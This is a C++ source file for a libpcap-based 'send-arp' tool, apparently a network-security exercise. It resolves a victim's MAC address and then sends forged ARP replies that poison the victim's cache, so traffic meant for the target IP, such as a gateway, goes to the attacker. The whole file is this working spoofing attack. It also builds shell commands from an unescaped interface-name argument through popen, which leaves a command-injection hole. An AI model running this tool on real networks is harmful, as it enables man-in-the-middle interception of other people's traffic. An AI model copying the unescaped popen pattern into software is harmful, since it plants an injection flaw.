#include <cstdlib>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <iostream>
#include <vector>
#include <map>
#include <ifaddrs.h>
#include <cctype>
#include <array>
#include <memory>
#include <sstream>
#include <unistd.h>
#include <algorithm> 

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

string execCommand(const string& cmd) {
    array<char, 128> buffer;
    string result;
    shared_ptr<FILE> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

class MyNet {
private:
    string dev;
    string myNetStatus;
    string myRoute;
    string myIP;
    string myIPBroad;
    string myMac;
    string gateway;

public:
    MyNet(string device) {
        this->dev = device;
        this->myNetStatus = execCommand("ip address show " + device);
        int _tIndex1 = myNetStatus.find("inet") + 5;
        int _tIndex2 = myNetStatus.find("/", _tIndex1);
        if (_tIndex1 == string::npos || _tIndex2 == string::npos) {
            throw runtime_error("Failed to parse IP address.");
        }
        this->myIP = myNetStatus.substr(_tIndex1, _tIndex2 - _tIndex1);
        
        int _tIndex3 = myNetStatus.find("brd", _tIndex2) + 4;
        int _tIndex4 = myNetStatus.find("scope", _tIndex3);
        if (_tIndex3 == string::npos || _tIndex4 == string::npos) {
            throw runtime_error("Failed to parse broadcast address.");
        }
        this->myIPBroad = myNetStatus.substr(_tIndex3, _tIndex4 - _tIndex3 - 1);
        this->myMac = myNetStatus.substr(myNetStatus.find("link/ether") + 11, 17);
        this->myRoute = execCommand("route -nn | grep " + device + " | grep G");
        istringstream iss(myRoute);
        string _;
        iss >> _ >> this->gateway;
        if (this->gateway.empty()) {
            throw runtime_error("Failed to parse gateway.");
        }
        cout << "!!!!MYNET!!!!" << endl;
    }

    char* getDev() {
        return &dev[0];
    }

    string getMyMac() {
        return this->myMac;
    }

    string getMyIP() {
        return this->myIP;
    }

    string getMyIPBroad() {
        return this->myIPBroad;
    }

    string getGateway() {
        return this->gateway;
    }
};

class ArpResource {
public:
    string eth_smac;
    string eth_dmac;
    string arp_smac;
    string arp_tmac;
    string arp_sip;
    string arp_tip;

    ArpResource(string eth_smac, string eth_dmac, string arp_smac, string arp_tmac, string arp_sip, string arp_tip)
        : eth_smac(eth_smac), eth_dmac(eth_dmac), arp_smac(arp_smac), arp_tmac(arp_tmac), arp_sip(arp_sip), arp_tip(arp_tip) {}
};

int arpSend(char* dev, int type, ArpResource arpST) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(arpST.eth_dmac);
    packet.eth_.smac_ = Mac(arpST.eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    packet.arp_.op_ = htons((type == 0) ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = Mac(arpST.arp_smac);
    packet.arp_.sip_ = htonl(Ip(arpST.arp_sip));
    packet.arp_.tmac_ = Mac(arpST.arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arpST.arp_tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return res;
}

string getMacOnARPReply(char* dev, string myMac) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        throw runtime_error("Couldn't open device " + string(dev) + ": " + string(errbuf));
    }

    struct bpf_program fp;
    string filter_exp = "arp";
    if (pcap_compile(handle, &fp, filter_exp.c_str(), 0, PCAP_NETMASK_UNKNOWN) == -1) {
        pcap_close(handle);
        throw runtime_error("Couldn't parse filter " + filter_exp + ": " + string(pcap_geterr(handle)));
    }

    if (pcap_setfilter(handle, &fp) == -1) {
        pcap_close(handle);
        throw runtime_error("Couldn't install filter " + filter_exp + ": " + string(pcap_geterr(handle)));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recvPacket = (EthArpPacket*)packet;

        if (ntohs(recvPacket->eth_.type_) == EthHdr::Arp &&
            ntohs(recvPacket->arp_.op_) == ArpHdr::Reply &&
            recvPacket->eth_.dmac_ == Mac(myMac)) {
            pcap_close(handle);
            return string(recvPacket->arp_.smac_);
        }
    }

    pcap_close(handle);
    throw runtime_error("No ARP reply received for the specified MAC address");
}

bool checkIP(const string& ip) {
    vector<string> parts;
    istringstream iss(ip);
    string part;
    while (getline(iss, part, '.')) {
        parts.push_back(part);
    }
    if (parts.size() != 4) return false;
    for (const string& p : parts) {
        if (p.empty() || p.size() > 3 || !all_of(p.begin(), p.end(), ::isdigit)) {
            return false;
        }
        int num = stoi(p);
        if (num < 0 || num > 255) return false;
    }
    return true;
}

string getMacOfIP(MyNet& myNet, const string& ip) {
    arpSend(myNet.getDev(), 0, ArpResource(
        myNet.getMyMac(),
        "FF:FF:FF:FF:FF:FF", 
        myNet.getMyMac(),
        "00:00:00:00:00:00",
        myNet.getMyIP(),
        ip
    ));
    return getMacOnARPReply(myNet.getDev(), myNet.getMyMac());
}

bool arpAttack(MyNet& myNet, const string& senderIP, const string& targetIP) {
    string senderMac = getMacOfIP(myNet, senderIP);
    cout << "arpSend" << endl;

    return arpSend(myNet.getDev(), 1, ArpResource(
        myNet.getMyMac(),
        senderMac, 
        myNet.getMyMac(),
        senderMac,
        targetIP,
        senderIP
    )) == 0;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    vector<string> argument;
    for (int i = 2; i < argc; ++i) {
        cout << argv[i] << endl;
        argument.push_back(argv[i]);
    }

    try {
        MyNet myNet(argv[1]);
        for (size_t i = 0; i < argument.size(); i += 2) {
            if (!checkIP(argument[i]) || !checkIP(argument[i + 1])) {
                usage();
                return -1;
            }
            arpAttack(myNet, argument[i], argument[i + 1]);
        }
    } catch (const exception& e) {
        cerr << e.what() << endl;
        return -1;
    }

    return 0;
}
